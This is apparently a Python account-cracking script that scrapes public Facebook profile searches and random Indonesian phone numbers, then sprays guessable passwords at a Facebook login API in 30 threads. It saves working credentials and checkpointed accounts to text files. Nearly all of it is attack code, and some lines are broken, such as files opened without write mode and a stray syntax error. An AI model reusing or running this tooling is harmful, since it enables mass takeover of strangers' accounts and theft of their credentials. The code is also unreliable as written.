#Creator:Fahmiapz
#Date:19/09/2020
#time:23:00
#Recode Teros Boss Tinggal Pake Apa Susahnya Anjeng
import requests,re,os,sys,time,json,random,urllib,mechanize
from requests.exceptions import ConnectionError
from time import sleep as timeout
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
def clear():
    os.system('clear')
def baner():
    print('\t\033[91m~\033[94mFB\033[00m Crack From Public\033[91m~\033[00m\n')
    print('\t\033[93m<\033[90m--------------------\033[93m>\033[00m')
die=0
chek=0
result=0
valid=[]
check=[]
id=[]
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [
             ('Host','mbasic.facebook.com'),
             ('user-agent','Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36'),
             ('accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),
             ('accept-language','id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7')
             ]
def login(user,pw,cek=False):
          global die,chek,result,valid,check,count
          #ck=requests.get('https://mbasic.facebook.com').text
          #ur=re.findall(r'method="post" action="(.*?)"', ck)[0]
          #lsd=re.findall(r'name="lsd" value="(.*?)"', ck)[0]
          #jz=re.findall(r'name="jazoest" value="(.*?)"', ck)[0]
          #ts=re.findall(r'name="m_ts" value="(.*?)"', ck)[0]
          #li=re.findall(r'name="li" value="(.*?)"', ck)[0]
          #tn=re.findall(r'name="try_number" value="(.*?)"', ck)[0]
          #un=re.findall(r'name="unrecognized_tries" value="(.*?)"', ck)[0]
          #url='https://mbasic.facebook.com'+ur
          #r=br.open(url,data='lsd='+lsd+'&jazoest='+jz+'&m_ts='+ts+'&li='+li+'&try_number='+tn+'&unrecognized_tries='+un+'&email='+user+'&pass='+pw+'&login=Masuk').geturl()
          r = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+user+'&locale=en_US&password='+pw+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') #proxies={'http':'http://36.94.70.234:80','https':'https://182.253.94.60:8080'}
          q=json.loads(r.text)
          if 'EAA' in r.text:
             print('\r\033[00m[\033[92mLive\033[00m]'+user+'\033[96m|\033[00m'+pw,                         end="")
             result+=1
             if cek:
                  valid.append(user+'|'+pw)
             else:
                  with open('valid.txt') as f:
                       f.write(user + '|' + pw + '\n')
          elif 'www.facebook.com' in q['error_msg']:
             print('\r\033[00m[\033[93mCheck\033[00m]'+user+'\033[96m|\033[00m'+pw,                       m end="")
             chek+=1
             if cek:
                  check.append(user+'|'+pw)
             else:
                 with open('check.txt') as f:
                      f.write(user + '|' + pw + '\n')
          else:
             die+=1
          for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[1;92m{str(result)} \033[00mcheckpoint : \033[1;93m{str(chek)} \033[00mdie : \033[1;91m{str(die)} \033[00m",end="")
                            time.sleep(0.2)

def search():
    knf=input('\t\033[00m[\033[96m?\033[00m]Query: \033[96m')
    src=br.open('https://mbasic.facebook.com/public/'+knf).read()
    users=re.findall(r'<td class="ca cb"><a href="(.*?)"><div class="cc"><div class="cd">(.*?)</div>', str(src))
    for user in users:
        w=user[0].replace('/','')
        if 'profile' in user[0]:
            id.append(user[1] + '|' + re.findall('=(\d*)',str(user[0]))[0])
        else:
            id.append(user[1] + '|' + w.split('?')[0])
        tt=re.findall('<div class="m n" id="see_more_pager"><a href="(.*?)"', str(src))
        for user in tt:
            w1=br.open(user).read()
            w2=re.findall(r'<td class="ca cb"><a href="(.*?)"><div class="cc"><div class="cd">(.*?)</div>', str(w1))
            for user in w2:
                ss=user[0].replace('/','')
                if 'profile' in user[0]:
                    id.append(user[1] + '|' + re.findall('=(\d*)',str(user[0]))[0])
                else:
                    id.append(user[1] + '|' + ss.split('?')[0])
    with ThreadPoolExecutor(max_workers=30) as ex:
         for user in id:
             users = user.split('|')
             ss = users[0].split(' ')
             for x in ss:
                 litpas = [
                         str(x)+'123',
                         str(x)+'1234',
                         str(x)+'12345',
                         str(x)+'123456'
                         ]
                 litpas.append('Sayang')
                 litpas.append('Bangsat')
                 litpas.append('Kontol')
                 litpas.append('Anjing')
                 litpas.append('786786')
                 litpas.append('Bangladesh')
                 for passw in set(litpas):
                     ex.submit(login,(users[1]),(passw))
def num():
    with ThreadPoolExecutor(max_workers=30) as ex:
         for n in range(1000):
             rd=random.randint(11111111,99999999)
             b=['96','95','57','58','38','19','13','77']
             b1=random.choice(b)
             g=str(b1)
             nm='08'+g+str(rd)
             litpas=[
                   'Sayang',
                   'Bangsat',
                   'Anjing',
                   'Kontol',
                   'Persib',
                   'Persija'
                   ]
             for passw in set(litpas):
                 ex.submit(login,(nm),(passw))
if __name__=="__main__":
     clear()
     baner()
     search()
